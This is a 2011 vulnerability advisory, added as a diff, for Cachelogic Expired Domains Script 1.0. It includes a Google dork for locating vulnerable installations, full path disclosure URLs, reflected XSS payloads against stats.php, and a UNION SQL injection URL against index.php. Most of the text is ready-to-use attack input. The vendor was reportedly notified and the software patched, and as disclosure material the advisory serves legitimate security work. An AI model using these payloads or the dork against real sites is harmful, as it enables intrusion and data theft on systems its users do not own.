@@ -1,0 +1,35 @@
+Cachelogic Expired Domains Script 1.0 multiple security vulnerabilities
+
+# Date: 2011-06-22
+# Author: Brendan Coles <bcoles@gmail.com>
+# Advisory: http://itsecuritysolutions.org/2011-03-24_Cachelogic_Expired_Domains_Script_1.0_multiple_security_vulnerabilities/
+
+# Software: Cachelogic Expired Domains Script
+# Version: <= 1.0
+# Google Dork: allinurl:page domain ext filter hyphen numbers ncharacter
+
+# Vendor: CacheLogic
+# Homepage: http://cachelogic.net/
+# Notified: 2011-03-20 (patched 2011-03-24)
+
+# Full Path Disclosure:
+
+http://localhost/[PATH]/index.php?page[]
+http://localhost/[PATH]/index.php?domain[]
+http://localhost/[PATH]/index.php?ext[]
+http://localhost/[PATH]/index.php?filter[]
+http://localhost/[PATH]/index.php?hyphen[]
+http://localhost/[PATH]/index.php?numbers[]
+http://localhost/[PATH]/index.php?ncharacter[]
+http://localhost/[PATH]/index.php?ncharacter='
+http://localhost/[PATH]/index.php?searchdays[]
+http://localhost/[PATH]/index.php?action[]
+
+# Reflected Cross-Site Scripting (XSS):
+
+http://localhost/[PATH]/stats.php?name="><script>alert(1)</script><p+"
+http://localhost/[PATH]/stats.php?ext="><script>alert(1)</script><p+"
+
+# SQL Injection:
+
+http://localhost/[PATH]/index.php?ncharacter=-1+union+select+@@version,null,null--
